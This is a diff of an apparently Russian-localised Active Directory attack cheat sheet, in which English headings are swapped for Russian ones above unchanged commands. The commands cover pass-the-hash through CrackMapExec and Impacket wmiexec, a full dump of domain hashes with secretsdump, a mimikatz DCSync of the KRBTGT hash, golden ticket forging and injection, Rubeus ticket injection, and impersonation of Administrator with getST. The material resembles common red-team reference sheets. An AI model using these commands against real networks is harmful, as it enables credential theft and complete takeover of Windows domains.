@@ -107,43 +107,43 @@ CrackMapExec: Pass-the-Hash (PtH) по SMB
 crackmapexec smb target -u user -H NTLM_HASH
 ```
 
-impacket: PtH WMI exec
+Impacket: Pass-the-Hash с помощью WMI exec
 
 ```
 python3 wmiexec.py -hashes :NTLM_HASH domain/user@target
 ```
 
-Dump all domain hashes
+Снять дамп всех хэшей домена
 
 ```
 python3 secretsdump.py domain/user:pass@<DC_IP>
 ```
 
-DCSync for KRBTGT hash
+DCSync: получение хэша KRBTGT
 
 ```
 mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
 ```
 
-Create + inject golden ticket
+Создание и внедрение золотого билета
 
 ```
 mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:<SID> /krbtgt:<NTLM> /ptt
 ```
 
-Inject existing ticket
+Внедрение существующего тикета
 
 ```
 mimikatz # kerberos::ptt ticket.kirbi
 ```
 
-Inject ticket into current session
+Внедрение тикета в текущую сессию
 
 ```
 Rubeus.exe ptt /ticket:<base64_ticket>
 ```
 
-Get service ticket
+Получение тикета службы
 ```
 python3 getST.py -spn cifs/<target> -impersonate Administrator domain.com/user:pass
 ```
